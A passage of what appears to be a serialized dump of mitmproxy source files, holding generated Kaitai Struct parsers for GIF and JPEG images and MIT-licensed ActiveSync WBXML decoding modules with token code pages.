        if hasattr(self, '_m_has_interlace'):\n                return self._m_has_interlace\n\n            self._m_has_interlace = (self.flags & 64) != 0\n            return getattr(self, '_m_has_interlace', None)\n\n        @property\n        def has_sorted_color_table(self):\n            if hasattr(self, '_m_has_sorted_color_table'):\n                return self._m_has_sorted_color_table\n\n            self._m_has_sorted_color_table = (self.flags & 32) != 0\n            return getattr(self, '_m_has_sorted_color_table', None)\n\n        @property\n        def color_table_size(self):\n            if hasattr(self, '_m_color_table_size'):\n                return self._m_color_table_size\n\n            self._m_color_table_size = (2 << (self.flags & 7))\n            return getattr(self, '_m_color_table_size', None)\n\n\n    class Block(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.block_type = KaitaiStream.resolve_enum(Gif.BlockType, self._io.read_u1())\n            _on = self.block_type\n            if _on == Gif.BlockType.extension:\n                self.body = Gif.Extension(self._io, self, self._root)\n            elif _on == Gif.BlockType.local_image_descriptor:\n                self.body = Gif.LocalImageDescriptor(self._io, self, self._root)\n\n\n    class ColorTable(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           - section 19 - https://www.w3.org/Graphics/GIF/spec-gif89a.txt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.entries = []\n            i = 0\n            while not self._io.is_eof():\n                self.entries.append(Gif.ColorTableEntry(self._io, self, self._root))\n                i += 1\n\n\n\n    class Header(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           - section 17 - https://www.w3.org/Graphics/GIF/spec-gif89a.txt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.magic = self._io.read_bytes(3)\n            if not self.magic == b\"\\x47\\x49\\x46\":\n                raise kaitaistruct.ValidationNotEqualError(b\"\\x47\\x49\\x46\", self.magic, self._io, u\"/types/header/seq/0\")\n            self.version = (self._io.read_bytes(3)).decode(u\"ASCII\")\n\n\n    class ExtGraphicControl(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           - section 23 - https://www.w3.org/Graphics/GIF/spec-gif89a.txt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.block_size = self._io.read_bytes(1)\n            if not self.block_size == b\"\\x04\":\n                raise kaitaistruct.ValidationNotEqualError(b\"\\x04\", self.block_size, self._io, u\"/types/ext_graphic_control/seq/0\")\n            self.flags = self._io.read_u1()\n            self.delay_time = self._io.read_u2le()\n            self.transparent_idx = self._io.read_u1()\n            self.terminator = self._io.read_bytes(1)\n            if not self.terminator == b\"\\x00\":\n                raise kaitaistruct.ValidationNotEqualError(b\"\\x00\", self.terminator, self._io, u\"/types/ext_graphic_control/seq/4\")\n\n        @property\n        def transparent_color_flag(self):\n            if hasattr(self, '_m_transparent_color_flag'):\n                return self._m_transparent_color_flag\n\n            self._m_transparent_color_flag = (self.flags & 1) != 0\n            return getattr(self, '_m_transparent_color_flag', None)\n\n        @property\n        def user_input_flag(self):\n            if hasattr(self, '_m_user_input_flag'):\n                return self._m_user_input_flag\n\n            self._m_user_input_flag = (self.flags & 2) != 0\n            return getattr(self, '_m_user_input_flag', None)\n\n\n    class Subblock(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len_bytes = self._io.read_u1()\n            self.bytes = self._io.read_bytes(self.len_bytes)\n\n\n    class ApplicationId(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len_bytes = self._io.read_u1()\n            if not self.len_bytes == 11:\n                raise kaitaistruct.ValidationNotEqualError(11, self.len_bytes, self._io, u\"/types/application_id/seq/0\")\n            self.application_identifier = (self._io.read_bytes(8)).decode(u\"ASCII\")\n            self.application_auth_code = self._io.read_bytes(3)\n\n\n    class ExtApplication(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.application_id = Gif.ApplicationId(self._io, self, self._root)\n            self.subblocks = []\n            i = 0\n            while True:\n                _ = Gif.Subblock(self._io, self, self._root)\n                self.subblocks.append(_)\n                if _.len_bytes == 0:\n                    break\n                i += 1\n\n\n    class Subblocks(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.entries = []\n            i = 0\n            while True:\n                _ = Gif.Subblock(self._io, self, self._root)\n                self.entries.append(_)\n                if _.len_bytes == 0:\n                    break\n                i += 1\n\n\n    class Extension(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.label = KaitaiStream.resolve_enum(Gif.ExtensionLabel, self._io.read_u1())\n            _on = self.label\n            if _on == Gif.ExtensionLabel.application:\n                self.body = Gif.ExtApplication(self._io, self, self._root)\n            elif _on == Gif.ExtensionLabel.comment:\n                self.body = Gif.Subblocks(self._io, self, self._root)\n            elif _on == Gif.ExtensionLabel.graphic_control:\n                self.body = Gif.ExtGraphicControl(self._io, self, self._root)\n            else:\n                self.body = Gif.Subblocks(self._io, self, self._root)\n\n\n\n", "mitmproxy/contrib/kaitaistruct/jpeg.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO\nfrom enum import Enum\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nfrom . import exif\nclass Jpeg(KaitaiStruct):\n    \"\"\"JPEG File Interchange Format, or JFIF, or, more colloquially known\n    as just \"JPEG\" or \"JPG\", is a popular 2D bitmap image file format,\n    offering lossy compression which works reasonably well with\n    photographic images.\n    \n    Format is organized as a container format, serving multiple\n    \"segments\", each starting with a magic and a marker. JFIF standard\n    dictates order and mandatory apperance of segments:\n    \n    * SOI\n    * APP0 (with JFIF magic)\n    * APP0 (with JFXX magic, optional)\n    * everything else\n    * SOS\n    * JPEG-compressed stream\n    * EOI\n    \"\"\"\n\n    class ComponentId(Enum):\n        y = 1\n        cb = 2\n        cr = 3\n        i = 4\n        q = 5\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.segments = []\n        i = 0\n        while not self._io.is_eof():\n            self.segments.append(Jpeg.Segment(self._io, self, self._root))\n            i += 1\n\n\n    class Segment(KaitaiStruct):\n\n        class MarkerEnum(Enum):\n            tem = 1\n            sof0 = 192\n            sof1 = 193\n            sof2 = 194\n            sof3 = 195\n            dht = 196\n            sof5 = 197\n            sof6 = 198\n            sof7 = 199\n            soi = 216\n            eoi = 217\n            sos = 218\n            dqt = 219\n            dnl = 220\n            dri = 221\n            dhp = 222\n            app0 = 224\n            app1 = 225\n            app2 = 226\n            app3 = 227\n            app4 = 228\n            app5 = 229\n            app6 = 230\n            app7 = 231\n            app8 = 232\n            app9 = 233\n            app10 = 234\n            app11 = 235\n            app12 = 236\n            app13 = 237\n            app14 = 238\n            app15 = 239\n            com = 254\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.magic = self._io.read_bytes(1)\n            if not self.magic == b\"\\xFF\":\n                raise kaitaistruct.ValidationNotEqualError(b\"\\xFF\", self.magic, self._io, u\"/types/segment/seq/0\")\n            self.marker = KaitaiStream.resolve_enum(Jpeg.Segment.MarkerEnum, self._io.read_u1())\n            if  ((self.marker != Jpeg.Segment.MarkerEnum.soi) and (self.marker != Jpeg.Segment.MarkerEnum.eoi)) :\n                self.length = self._io.read_u2be()\n\n            if  ((self.marker != Jpeg.Segment.MarkerEnum.soi) and (self.marker != Jpeg.Segment.MarkerEnum.eoi)) :\n                _on = self.marker\n                if _on == Jpeg.Segment.MarkerEnum.app1:\n                    self._raw_data = self._io.read_bytes((self.length - 2))\n                    _io__raw_data = KaitaiStream(BytesIO(self._raw_data))\n                    self.data = Jpeg.SegmentApp1(_io__raw_data, self, self._root)\n                elif _on == Jpeg.Segment.MarkerEnum.app0:\n                    self._raw_data = self._io.read_bytes((self.length - 2))\n                    _io__raw_data = KaitaiStream(BytesIO(self._raw_data))\n                    self.data = Jpeg.SegmentApp0(_io__raw_data, self, self._root)\n                elif _on == Jpeg.Segment.MarkerEnum.sof0:\n                    self._raw_data = self._io.read_bytes((self.length - 2))\n                    _io__raw_data = KaitaiStream(BytesIO(self._raw_data))\n                    self.data = Jpeg.SegmentSof0(_io__raw_data, self, self._root)\n                elif _on == Jpeg.Segment.MarkerEnum.sos:\n                    self._raw_data = self._io.read_bytes((self.length - 2))\n                    _io__raw_data = KaitaiStream(BytesIO(self._raw_data))\n                    self.data = Jpeg.SegmentSos(_io__raw_data, self, self._root)\n                else:\n                    self.data = self._io.read_bytes((self.length - 2))\n\n            if self.marker == Jpeg.Segment.MarkerEnum.sos:\n                self.image_data = self._io.read_bytes_full()\n\n\n\n    class SegmentSos(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.num_components = self._io.read_u1()\n            self.components = []\n            for i in range(self.num_components):\n                self.components.append(Jpeg.SegmentSos.Component(self._io, self, self._root))\n\n            self.start_spectral_selection = self._io.read_u1()\n            self.end_spectral = self._io.read_u1()\n            self.appr_bit_pos = self._io.read_u1()\n\n        class Component(KaitaiStruct):\n            def __init__(self, _io, _parent=None, _root=None):\n                self._io = _io\n                self._parent = _parent\n                self._root = _root if _root else self\n                self._read()\n\n            def _read(self):\n                self.id = KaitaiStream.resolve_enum(Jpeg.ComponentId, self._io.read_u1())\n                self.huffman_table = self._io.read_u1()\n\n\n\n    class SegmentApp1(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.magic = (self._io.read_bytes_term(0, False, True, True)).decode(u\"ASCII\")\n            _on = self.magic\n            if _on == u\"Exif\":\n                self.body = Jpeg.ExifInJpeg(self._io, self, self._root)\n\n\n    class SegmentSof0(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.bits_per_sample = self._io.read_u1()\n            self.image_height = self._io.read_u2be()\n            self.image_width = self._io.read_u2be()\n            self.num_components = self._io.read_u1()\n            self.components = []\n            for i in range(self.num_components):\n                self.components.append(Jpeg.SegmentSof0.Component(self._io, self, self._root))\n\n\n        class Component(KaitaiStruct):\n            def __init__(self, _io, _parent=None, _root=None):\n                self._io = _io\n                self._parent = _parent\n                self._root = _root if _root else self\n                self._read()\n\n            def _read(self):\n                self.id = KaitaiStream.resolve_enum(Jpeg.ComponentId, self._io.read_u1())\n                self.sampling_factors = self._io.read_u1()\n                self.quantization_table_id = self._io.read_u1()\n\n            @property\n            def sampling_x(self):\n                if hasattr(self, '_m_sampling_x'):\n                    return self._m_sampling_x\n\n                self._m_sampling_x = ((self.sampling_factors & 240) >> 4)\n                return getattr(self, '_m_sampling_x', None)\n\n            @property\n            def sampling_y(self):\n                if hasattr(self, '_m_sampling_y'):\n                    return self._m_sampling_y\n\n                self._m_sampling_y = (self.sampling_factors & 15)\n                return getattr(self, '_m_sampling_y', None)\n\n\n\n    class ExifInJpeg(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.extra_zero = self._io.read_bytes(1)\n            if not self.extra_zero == b\"\\x00\":\n                raise kaitaistruct.ValidationNotEqualError(b\"\\x00\", self.extra_zero, self._io, u\"/types/exif_in_jpeg/seq/0\")\n            self._raw_data = self._io.read_bytes_full()\n            _io__raw_data = KaitaiStream(BytesIO(self._raw_data))\n            self.data = exif.Exif(_io__raw_data)\n\n\n    class SegmentApp0(KaitaiStruct):\n\n        class DensityUnit(Enum):\n            no_units = 0\n            pixels_per_inch = 1\n            pixels_per_cm = 2\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.magic = (self._io.read_bytes(5)).decode(u\"ASCII\")\n            self.version_major = self._io.read_u1()\n            self.version_minor = self._io.read_u1()\n            self.density_units = KaitaiStream.resolve_enum(Jpeg.SegmentApp0.DensityUnit, self._io.read_u1())\n            self.density_x = self._io.read_u2be()\n            self.density_y = self._io.read_u2be()\n            self.thumbnail_x = self._io.read_u1()\n            self.thumbnail_y = self._io.read_u1()\n            self.thumbnail = self._io.read_bytes(((self.thumbnail_x * self.thumbnail_y) * 3))\n\n\n\n", "mitmproxy/contrib/wbxml/ASWBXMLCodePage.py": "#!/usr/bin/env python3\n'''\n@author: David Shaw, shawd@vmware.com\n\nInspired by EAS Inspector for Fiddler\nhttps://easinspectorforfiddler.codeplex.com\n\n----- The MIT License (MIT) ----- \nFilename: ASWBXMLCodePage.py\nCopyright (c) 2014, David P. Shaw\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n'''\nclass ASWBXMLCodePage:\n\tdef __init__(self):\n\t\tself.namespace = \"\"\n\t\tself.xmlns = \"\"\n\t\tself.tokenLookup = {}\n\t\tself.tagLookup = {}\n\t\n\tdef addToken(self, token, tag):\n\t\tself.tokenLookup[token] = tag\n\t\tself.tagLookup[tag] = token\n\t\n\tdef getToken(self, tag):\n\t\tif tag in self.tagLookup:\n\t\t\treturn self.tagLookup[tag]\n\t\treturn 0xFF\n\t\n\tdef getTag(self, token):\n\t\tif token in self.tokenLookup:\n\t\t\treturn self.tokenLookup[token]\n\t\treturn None\n\t\n\tdef __repr__(self):\n\t\treturn str(self.tokenLookup)\n", "mitmproxy/contrib/wbxml/ASCommandResponse.py": "#!/usr/bin/env python3\n'''\n@author: David Shaw, shawd@vmware.com\n\nInspired by EAS Inspector for Fiddler\nhttps://easinspectorforfiddler.codeplex.com\n\n----- The MIT License (MIT) ----- \nFilename: ASCommandResponse.py\nCopyright (c) 2014, David P. Shaw\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n'''\nfrom .ASWBXML import ASWBXML\nimport logging\n\nclass ASCommandResponse:\n\n\tdef __init__(self, response):\n\t\tself.wbxmlBody = response\n\t\ttry:\n\t\t\tif ( len(response) > 0):\n\t\t\t\tself.xmlString = self.decodeWBXML(self.wbxmlBody)\n\t\t\telse:\n\t\t\t\traise ValueError(\"Empty WBXML body passed\")\n\t\texcept Exception as e:\n\t\t\tself.xmlString = None\n\t\t\traise ValueError(\"Error: {0}\".format(e))\n\n\tdef getWBXMLBytes(self):\n\t\treturn self.wbxmlBytes\n\t\n\tdef getXMLString(self):\n\t\treturn self.xmlString\n\t\n\tdef decodeWBXML(self, body):\n\t\tself.instance = ASWBXML()\n\t\tself.instance.loadBytes(body)\n\t\treturn self.instance.getXml()\n\nif __name__ == \"__main__\":\n\timport os\t\n\tlogging.basicConfig(level=logging.INFO)\n\n\tprojectDir = os.path.dirname(os.path.realpath(\".\"))\n\tsamplesDir = os.path.join(projectDir, \"Samples/\")\n\tlistOfSamples = os.listdir(samplesDir)\n\n\tfor filename in listOfSamples:\n\t\twith open(samplesDir + os.sep + filename, \"rb\") as f:\n\t\t\tbyteWBXML = f.read()\n\n\t\tlogging.info(\"-\"*100)\n\t\tlogging.info(filename)\n\t\tlogging.info(\"-\"*100)\n\t\tinstance = ASCommandResponse(byteWBXML)\n\t\tlogging.info(instance.xmlString)\n", "mitmproxy/contrib/wbxml/ASWBXML.py": "#!/usr/bin/env python3\n'''\n@author: David Shaw, shawd@vmware.com\n\nInspired by EAS Inspector for Fiddler\nhttps://easinspectorforfiddler.codeplex.com\n\n----- The MIT License (MIT) ----- \nFilename: ASWBXML.py\nCopyright (c) 2014, David P. Shaw\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n'''\nimport xml.dom.minidom\nimport logging\n\nfrom .ASWBXMLCodePage import ASWBXMLCodePage\nfrom .ASWBXMLByteQueue import ASWBXMLByteQueue\nfrom .GlobalTokens import GlobalTokens\nfrom .InvalidDataException import InvalidDataException\n\nclass ASWBXML:\n\tversionByte = 0x03\n\tpublicIdentifierByte = 0x01\n\tcharacterSetByte = 0x6A\n\tstringTableLengthByte = 0x00\n\t\n\tdef __init__(self):\n\t\t\n\t\t# empty on init\n\t\tself.xmlDoc = xml.dom.minidom.Document()\n\t\tself.currentCodePage = 0\n\t\tself.defaultCodePage = -1\n\t\t\n\t\t# Load up code pages\n\t\t# Currently there are 25 code pages as per MS-ASWBXML\n\t\tself.codePages = []\n\n\t\t# region Code Page Initialization\n\t\t# Code Page 0: AirSync\n\t\t# region AirSync Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"AirSync:\"\n\t\tpage.xmlns = \"airsync\"\n\n\t\tpage.addToken(0x05, \"Sync\")\n\t\tpage.addToken(0x06, \"Responses\")\n\t\tpage.addToken(0x07, \"Add\")\n\t\tpage.addToken(0x08, \"Change\")\n\t\tpage.addToken(0x09, \"Delete\")\n\t\tpage.addToken(0x0A, \"Fetch\")\n\t\tpage.addToken(0x0B, \"SyncKey\")\n\t\tpage.addToken(0x0C, \"ClientId\")\n\t\tpage.addToken(0x0D, \"ServerId\")\n\t\tpage.addToken(0x0E, \"Status\")\n\t\tpage.addToken(0x0F, \"Collection\")\n\t\tpage.addToken(0x10, \"Class\")\n\t\tpage.addToken(0x12, \"CollectionId\")\n\t\tpage.addToken(0x13, \"GetChanges\")\n\t\tpage.addToken(0x14, \"MoreAvailable\")\n\t\tpage.addToken(0x15, \"WindowSize\")\n\t\tpage.addToken(0x16, \"Commands\")\n\t\tpage.addToken(0x17, \"Options\")\n\t\tpage.addToken(0x18, \"FilterType\")\n\t\tpage.addToken(0x1B, \"Conflict\")\n\t\tpage.addToken(0x1C, \"Collections\")\n\t\tpage.addToken(0x1D, \"ApplicationData\")\n\t\tpage.addToken(0x1E, \"DeletesAsMoves\")\n\t\tpage.addToken(0x20, \"Supported\")\n\t\tpage.addToken(0x21, \"SoftDelete\")\n\t\tpage.addToken(0x22, \"MIMESupport\")\n\t\tpage.addToken(0x23, \"MIMETruncation\")\n\t\tpage.addToken(0x24, \"Wait\")\n\t\tpage.addToken(0x25, \"Limit\")\n\t\tpage.addToken(0x26, \"Partial\")\n\t\tpage.addToken(0x27, \"ConversationMode\")\n\t\tpage.addToken(0x28, \"MaxItems\")\n\t\tpage.addToken(0x29, \"HeartbeatInterval\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 1: Contacts\n\t\t# region Contacts Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Contacts:\"\n\t\tpage.xmlns = \"contacts\"\n\n\t\tpage.addToken(0x05, \"Anniversary\")\n\t\tpage.addToken(0x06, \"AssistantName\")\n\t\tpage.addToken(0x07, \"AssistantTelephoneNumber\")\n\t\tpage.addToken(0x08, \"Birthday\")\n\t\tpage.addToken(0x0C, \"Business2PhoneNumber\")\n\t\tpage.addToken(0x0D, \"BusinessCity\")\n\t\tpage.addToken(0x0E, \"BusinessCountry\")\n\t\tpage.addToken(0x0F, \"BusinessPostalCode\")\n\t\tpage.addToken(0x10, \"BusinessState\")\n\t\tpage.addToken(0x11, \"BusinessStreet\")\n\t\tpage.addToken(0x12, \"BusinessFaxNumber\")\n\t\tpage.addToken(0x13, \"BusinessPhoneNumber\")\n\t\tpage.addToken(0x14, \"CarPhoneNumber\")\n\t\tpage.addToken(0x15, \"Categories\")\n\t\tpage.addToken(0x16, \"Category\")\n\t\tpage.addToken(0x17, \"Children\")\n\t\tpage.addToken(0x18, \"Child\")\n\t\tpage.addToken(0x19, \"CompanyName\")\n\t\tpage.addToken(0x1A, \"Department\")\n\t\tpage.addToken(0x1B, \"Email1Address\")\n\t\tpage.addToken(0x1C, \"Email2Address\")\n\t\tpage.addToken(0x1D, \"Email3Address\")\n\t\tpage.addToken(0x1E, \"FileAs\")\n\t\tpage.addToken(0x1F, \"FirstName\")\n\t\tpage.addToken(0x20, \"Home2PhoneNumber\")\n\t\tpage.addToken(0x21, \"HomeCity\")\n\t\tpage.addToken(0x22, \"HomeCountry\")\n\t\tpage.addToken(0x23, \"HomePostalCode\")\n\t\tpage.addToken(0x24, \"HomeState\")\n\t\tpage.addToken(0x25, \"HomeStreet\")\n\t\tpage.addToken(0x26, \"HomeFaxNumber\")\n\t\tpage.addToken(0x27, \"HomePhoneNumber\")\n\t\tpage.addToken(0x28, \"JobTitle\")\n\t\tpage.addToken(0x29, \"LastName\")\n\t\tpage.addToken(0x2A, \"MiddleName\")\n\t\tpage.addToken(0x2B, \"MobilePhoneNumber\")\n\t\tpage.addToken(0x2C, \"OfficeLocation\")\n\t\tpage.addToken(0x2D, \"OtherCity\")\n\t\tpage.addToken(0x2E, \"OtherCountry\")\n\t\tpage.addToken(0x2F, \"OtherPostalCode\")\n\t\tpage.addToken(0x30, \"OtherState\")\n\t\tpage.addToken(0x31, \"OtherStreet\")\n\t\tpage.addToken(0x32, \"PagerNumber\")\n\t\tpage.addToken(0x33, \"RadioPhoneNumber\")\n\t\tpage.addToken(0x34, \"Spouse\")\n\t\tpage.addToken(0x35, \"Suffix\")\n\t\tpage.addToken(0x36, \"Title\")\n\t\tpage.addToken(0x37, \"Webpage\")\n\t\tpage.addToken(0x38, \"YomiCompanyName\")\n\t\tpage.addToken(0x39, \"YomiFirstName\")\n\t\tpage.addToken(0x3A, \"YomiLastName\")\n\t\tpage.addToken(0x3C, \"Picture\")\n\t\tpage.addToken(0x3D, \"Alias\")\n\t\tpage.addToken(0x3E, \"WeightedRank\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 2: Email\n\t\t# region Email Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Email:\"\n\t\tpage.xmlns = \"email\"\n\n\t\tpage.addToken(0x0F, \"DateReceived\")\n\t\tpage.addToken(0x11, \"DisplayTo\")\n\t\tpage.addToken(0x12, \"Importance\")\n\t\tpage.addToken(0x13, \"MessageClass\")\n\t\tpage.addToken(0x14, \"Subject\")\n\t\tpage.addToken(0x15, \"Read\")\n\t\tpage.addToken(0x16, \"To\")\n\t\tpage.addToken(0x17, \"CC\")\n\t\tpage.addToken(0x18, \"From\")\n\t\tpage.addToken(0x19, \"ReplyTo\")\n\t\tpage.addToken(0x1A, \"AllDayEvent\")\n\t\tpage.addToken(0x1B, \"Categories\")\n\t\tpage.addToken(0x1C, \"Category\")\n\t\tpage.addToken(0x1D, \"DTStamp\")\n\t\tpage.addToken(0x1E, \"EndTime\")\n\t\tpage.addToken(0x1F, \"InstanceType\")\n\t\tpage.addToken(0x20, \"BusyStatus\")\n\t\tpage.addToken(0x21, \"Location\")\n\t\tpage.addToken(0x22, \"MeetingRequest\")\n\t\tpage.addToken(0x23, \"Organizer\")\n\t\tpage.addToken(0x24, \"RecurrenceId\")\n\t\tpage.addToken(0x25, \"Reminder\")\n\t\tpage.addToken(0x26, \"ResponseRequested\")\n\t\tpage.addToken(0x27, \"Recurrences\")\n\t\tpage.addToken(0x28, \"Recurrence\")\n\t\tpage.addToken(0x29, \"Recurrence_Type\")\n\t\tpage.addToken(0x2A, \"Recurrence_Until\")\n\t\tpage.addToken(0x2B, \"Recurrence_Occurrences\")\n\t\tpage.addToken(0x2C, \"Recurrence_Interval\")\n\t\tpage.addToken(0x2D, \"Recurrence_DayOfWeek\")\n\t\tpage.addToken(0x2E, \"Recurrence_DayOfMonth\")\n\t\tpage.addToken(0x2F, \"Recurrence_WeekOfMonth\")\n\t\tpage.addToken(0x30, \"Recurrence_MonthOfYear\")\n\t\tpage.addToken(0x31, \"StartTime\")\n\t\tpage.addToken(0x32, \"Sensitivity\")\n\t\tpage.addToken(0x33, \"TimeZone\")\n\t\tpage.addToken(0x34, \"GlobalObjId\")\n\t\tpage.addToken(0x35, \"ThreadTopic\")\n\t\tpage.addToken(0x39, \"InternetCPID\")\n\t\tpage.addToken(0x3A, \"Flag\")\n\t\tpage.addToken(0x3B, \"FlagStatus\")\n\t\tpage.addToken(0x3C, \"ContentClass\")\n\t\tpage.addToken(0x3D, \"FlagType\")\n\t\tpage.addToken(0x3E, \"CompleteTime\")\n\t\tpage.addToken(0x3F, \"DisallowNewTimeProposal\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 3: AirNotify - retired\n\t\t# region AirNotify Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"\"\n\t\tpage.xmlns = \"\"\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 4: Calendar\n\t\t# region Calendar Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Calendar:\"\n\t\tpage.xmlns = \"calendar\"\n\n\t\tpage.addToken(0x05, \"TimeZone\")\n\t\tpage.addToken(0x06, \"AllDayEvent\")\n\t\tpage.addToken(0x07, \"Attendees\")\n\t\tpage.addToken(0x08, \"Attendee\")\n\t\tpage.addToken(0x09, \"Attendee_Email\")\n\t\tpage.addToken(0x0A, \"Attendee_Name\")\n\t\tpage.addToken(0x0D, \"BusyStatus\")\n\t\tpage.addToken(0x0E, \"Categories\")\n\t\tpage.addToken(0x0F, \"Category\")\n\t\tpage.addToken(0x11, \"DTStamp\")\n\t\tpage.addToken(0x12, \"EndTime\")\n\t\tpage.addToken(0x13, \"Exception\")\n\t\tpage.addToken(0x14, \"Exceptions\")\n\t\tpage.addToken(0x15, \"Exception_Deleted\")\n\t\tpage.addToken(0x16, \"Exception_StartTime\")\n\t\tpage.addToken(0x17, \"Location\")\n\t\tpage.addToken(0x18, \"MeetingStatus\")\n\t\tpage.addToken(0x19, \"Organizer_Email\")\n\t\tpage.addToken(0x1A, \"Organizer_Name\")\n\t\tpage.addToken(0x1B, 